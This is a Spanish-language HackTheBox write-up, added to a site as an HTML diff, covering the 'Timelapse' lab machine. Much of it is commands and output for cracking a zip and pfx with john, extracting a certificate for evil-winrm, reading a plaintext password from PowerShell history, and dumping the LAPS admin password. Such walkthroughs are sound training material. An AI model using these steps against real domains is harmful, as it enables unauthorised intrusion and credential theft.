@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackTheBox Timelapse</title>
+
+  <meta name="description" content="Resolución de la máquina Timelapse de la plataforma de HackTheBox">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox Timelapse">
+  <meta name="twitter:description" content="Resolución de la máquina Timelapse de la plataforma de HackTheBox">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/timelapse.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox Timelapse">
+  <meta property="og:description" content="Resolución de la máquina Timelapse de la plataforma de HackTheBox">
+  <meta property="og:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/timelapse.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/timelapse.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="canonical" href="http://localhost:4000/">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox Timelapse" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/htb" title="GatoGamer1155" class="blog-button">HackTheBox</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#shell-legacyy">Shell - legacyy</a></li>
+        <li><a href="#shell-svc_deploy">Shell - svc_deploy</a></li>
+        <li><a href="#shell-administrator">Shell - Administrator</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackTheBox</h4>
+    <picture><img src="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/timelapse.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Timelapse</h2><br>
+  </header>
+  
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con nmap donde encontramos varios puertos abiertos, en Windows es recomendable usar el parametro <code class="language-plaintext highlighter-rouge">-Pn</code> para forzar el escaneo aunque no reciba respuesta de los paquetes ping</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">10.10.11.152 -Pn
+Nmap scan report for 10.10.11.152  
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5986/tcp  open  wsmans
+9389/tcp  open  adws
+49667/tcp open  unknown
+49673/tcp open  unknown
+49674/tcp open  unknown</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con crackmapexec a nivel de smb podemos ver que nos detecta la versión de windows que esta corriendo y el dominio de la máquina <code class="language-plaintext highlighter-rouge">timelapse.htb</code><p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.10.11.152
+</span><span class="az">SMB         </span><span class="p">10.10.11.152  445    DC01             </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para que sepa a donde cuando le pasemos el dominio, lo agregamos al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> con la ip designada<p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo </span><span class="am">"10.10.11.152 timelapse.htb"</span><span class="p"> | </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con smbclient podemos listar los recursos compartidos a nivel de smb y encontramos uno fuera de lo usual, el recurso <code class="language-plaintext highlighter-rouge">Shares</code><p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ smbclient</span><span class="p"> -N -L timelapse.htb
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	Shares          Disk      
+	SYSVOL          Disk      Logon server share  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nos conectamos al recurso Shares, al entrar al directorio Dev encontramos un archivo con un nombre bastante llamativo <code class="language-plaintext highlighter-rouge">winrm_backup.zip</code>, lo descargamos con get<p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ smbclient</span><span class="p"> -N //timelapse.htb/Shares
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Mon Oct 25 10:39:15 2021
+  ..                                  D        0  Mon Oct 25 10:39:15 2021
+  Dev                                 D        0  Mon Oct 25 14:40:06 2021
+  HelpDesk                            D        0  Mon Oct 25 10:48:42 2021
+
+		6367231 blocks of size 4096. 1285859 blocks available
+smb: \> cd Dev
+smb: \Dev\> dir
+  .                                   D        0  Mon Oct 25 14:40:06 2021
+  ..                                  D        0  Mon Oct 25 14:40:06 2021
+  winrm_backup.zip                    A     2611  Mon Oct 25 10:46:42 2021
+
+		6367231 blocks of size 4096. 1285859 blocks available
+smb: \Dev\> get winrm_backup.zip
+getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (3.9 KiloBytes/sec) (average 3.9 KiloBytes/sec)  
+smb: \Dev\></span>
+</code></pre></div></div><br>
+</section>
+
+<section class="post" id="shell-legacyy">
+<br><h3 class="post-title">Shell - legacyy</h3><br>
+
+<p class="plain-text">Listando lo que tiene el zip sin descomprimirlo nos encontramos un archivo pfx y por el nombre sabemos que sirve para la autenticación como el usuario legacyy</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ 7z</span><span class="p"> l winrm_backup.zip
+
+7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+
+Scanning the drive for archives:
+1 file, 2611 bytes (3 KiB)
+
+Listing archive: winrm_backup.zip
+
+--
+Path = winrm_backup.zip
+Type = zip
+Physical Size = 2611
+
+   Date      Time    Attr     Size   Compressed  Name
+------------------- ----- -------- ------------  ------------------------
+2021-10-25 08:21:20 .....     2555         2405  legacyy_dev_auth.pfx
+------------------- ----- -------- ------------  ------------------------  
+2021-10-25 08:21:20           2555         2405  1 files</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sabemos el contenido del zip pero para leer el contenido del pfx necesitamos descomprimirlo, al intentar unzipearlo nos pide una contraseña, esta protegido</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ unzip </span><span class="p">winrm_backup.zip 
+Archive:  winrm_backup.zip
+[winrm_backup.zip] legacyy_dev_auth.pfx password:  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos usar zip2john para generar un hash para después aplicar fuerza bruta con el rockyou, john consigue encontrar la contraseña valida <code class="language-plaintext highlighter-rouge">supremelegacy</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ zip2john </span><span class="p">winrm_backup.zip > hash
+ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: 2b chk, TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683  
+
+</span><span class="ve">❯ john</span><span class="p"> -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class="am">supremelegacy</span><span class="p">    (</span><span class="am">winrm_backup.zip/legacyy_dev_auth.pfx</span><span class="p">)
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Unzipeamos el archivo comprimido con la contraseña y obtenemos el archivo pfx</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ unzip </span><span class="p">winrm_backup.zip
+Archive:  winrm_backup.zip
+[winrm_backup.zip] legacyy_dev_auth.pfx password: supremelegacy  
+  inflating: legacyy_dev_auth.pfx
+
+</span><span class="ve">❯ ls </span><span class="p">legacyy_dev_auth.pfx
+</span><span class="ve"> legacyy_dev_auth.pfx</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">De acuerdo con un <a href="https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file">articulo</a> de IBM podemos extraer un certificado y una clave privada del pfx usando la herramienta openssl con pkcs12, pero al hacerlo nos pide contraseña</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ openssl </span><span class="p">pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out crt  
+Enter Import Password:  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Igual que con el zip, hacemos lo mismo con el pfx, usando pfx2john creamos un hash y aplicando fuerza bruta obtenemos la contraseña <code class="language-plaintext highlighter-rouge">thuglegacy</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ pfx2john </span><span class="p">legacyy_dev_auth.pfx > hash
+
+</span><span class="ve">❯ john</span><span class="p"> -w:passwords hash                 
+Using default input encoding: UTF-8
+Loaded 1 password hash (pfx [PKCS12 PBE (.pfx, .p12) (SHA-1 to SHA-512) 128/128 XOP 4x2])  
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class="am">thuglegacy</span><span class="p">       (</span><span class="am">legacyy_dev_auth.pfx</span><span class="p">)
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora usando esa contraseña con ayuda de openssl podemos extraer el certificado y la clave privada del archivo pfx</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ openssl </span><span class="p">pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out crt  
+Enter Import Password: thuglegacy
+
+</span><span class="ve">❯ openssl </span><span class="p">pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key
+Enter Import Password: thuglegacy
+Enter PEM pass phrase: thuglegacy
+Verifying - Enter PEM pass phrase: thuglegacy</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con evil-winrm por el puerto ssl (5986) podemos autenticarnos pasandole esos 2 archivos, como resultado obtenemos una shell como legacyy</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm</span><span class="p"> -S -i timelapse.htb -c crt -k key
+
+Enter PEM pass phrase: thuglegacy
+
+PS C:\Users\legacyy\Documents> </span><span class="am">whoami</span><span class="p">
+timelapse\legacyy
+PS C:\Users\legacyy\Documents> </span><span class="am">type</span><span class="p"> ..\Desktop\user.txt  
+81a**************************2ba
+PS C:\Users\legacyy\Documents></span>
+</code></pre></div></div><br>
+</section>
+
+<section class="post" id="shell-svc_deploy">
+<br><h3 class="post-title">Shell - svc_deploy</h3><br>
+
+<p class="plain-text">Una de las cosas a probar el el historial de powershell que siempre tiene la misma ruta, al leerla encontramos credenciales en texto claro de el usuario <code class="language-plaintext highlighter-rouge">svc_deploy</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\legacyy\Documents> </span><span class="am">type </span><span class="p">C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt  
+whoami
+ipconfig /all
+netstat -ano |select-string LIST
+$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
+$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
+invoke-command -computername localhost -credential $c -port 5986 -usessl -
+SessionOption $so -scriptblock {whoami}
+get-aduser -filter * -properties *
+exit
+PS C:\Users\legacyy\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Mirando la información del usuario svc_deploy podemos ver que es parte del grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code> por lo que deberia poder conectarse a winrm</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\legacyy\Documents> </span><span class="am">Get-ADPrincipalGroupMembership </span><span class="p">svc_deploy | </span><span class="am">Select </span><span class="p">Name  
+
+Name
+----
+Domain Users
+Remote Management Users
+LAPS_Readers
+
+PS C:\Users\legacyy\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nos conectamos como el usuario svc_deploy con evil-winrm, obtenemos una shell</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm</span><span class="p"> -S -i timelapse.htb -u svc_deploy -p </span><span class="am">'E3R$Q62^12p7PLlC%KWaxuaV'</span><span class="p">  
+
+PS C:\Users\svc_deploy\Documents> </span><span class="am">whoami</span><span class="p">
+timelapse\svc_deploy
+PS C:\Users\svc_deploy\Documents></span>
+</code></pre></div></div><br>
+</section>
+
+<section class="post" id="shell-administrator">
+<br><h3 class="post-title">Shell - Administrator</h3><br>
+
+<p class="plain-text">Repasemos de nuevo, el usuario en el que estamos actualmente también es parte del grupo <code class="language-plaintext highlighter-rouge">LAPS_Readers</code>, Laps muchas veces permite en los ordenadores del dominio a usuarios leer contraseñas de Administradores dependiendo los permisos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\legacyy\Documents> </span><span class="am">Get-ADPrincipalGroupMembership </span><span class="p">svc_deploy | </span><span class="am">Select </span><span class="p">Name  
+
+Name
+----
+Domain Users
+Remote Management Users
+LAPS_Readers
+
+PS C:\Users\legacyy\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para obtener la contraseña de Administrator basta con leer del equipo DC01 del directorio activo la propiedad <code class="language-plaintext highlighter-rouge">ms-mcs-admpwd</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\svc_deploy\Documents> </span><span class="am">Get-ADComputer </span><span class="p">DC01 </span><span class="c1">-Property </span><span class="az">'ms-mcs-admpwd'</span><span class="p">  
+
+DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
+DNSHostName       : dc01.timelapse.htb
+Enabled           : True
+ms-mcs-admpwd     : 2mpY8H70i(28Q@B0M8r0c0cF
+Name              : DC01
+ObjectClass       : computer
+ObjectGUID        : 6e10b102-6936-41aa-bb98-bed624c9b98f
+SamAccountName    : DC01$
+SID               : S-1-5-21-671920749-559770252-3318990721-1000
+UserPrincipalName :
+
+PS C:\Users\svc_deploy\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Usamos la contraseña que se nos muestra para conectarnos con evil-winrm, obtenemos una shell como Administrator sin embargo no esta la flag en el escritorio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ evil-winrm</span><span class="p"> -S -i timelapse.htb -u Administrator -p </span><span class="am">'2mpY8H70i(28Q@B0M8r0c0cF'</span><span class="p">  
+
+PS C:\Users\Administrator\Documents> </span><span class="am">whoami</span><span class="p">
+timelapse\administrator
+PS C:\Users\Administrator\Documents> </span><span class="am">dir</span><span class="p"> ..\Desktop
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Desde el directorio <code class="language-plaintext highlighter-rouge">C:\Users</code> buscamos de manera recursiva el root.txt, esta en el escritorio de TRX, asi que podemos simplemente leerlo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users> </span><span class="am">dir </span><span class="c1">-recurse </span><span class="p">root.txt
+
+    Directory: C:\Users\TRX\Desktop
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        3/16/2023   1:10 AM             34 root.txt  
+
+PS C:\Users> </span><span class="am">type </span><span class="p">C:\Users\TRX\Desktop\root.txt
+ c1d**************************431
+PS C:\Users></span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
